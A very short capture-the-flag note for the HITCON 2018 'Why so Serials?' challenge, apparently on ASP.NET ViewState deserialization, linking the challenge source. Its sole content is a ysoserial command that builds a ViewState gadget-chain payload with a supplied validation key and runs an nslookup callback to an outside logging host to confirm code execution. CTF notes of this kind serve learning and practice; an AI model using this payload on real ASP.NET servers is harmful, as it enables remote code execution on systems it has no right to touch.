# HITCON 2018: Why so Serials? (Derserialize viewstate)

---

Source: [here](https://github.com/orangetw/My-CTF-Web-Challenges/tree/master/hitcon-ctf-2018/why-so-serials/src)

(Take note and not writeup)

---

```cmd
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "nslookup bbb.33f7a0b0d12066cbbded.d.zhack.ca" --validationalg="MD5" --decryptionkey="DES" --validationkey="b07b0f97365416288cf0247cffdf135d25f6be87" --generator=CA0B0334
```



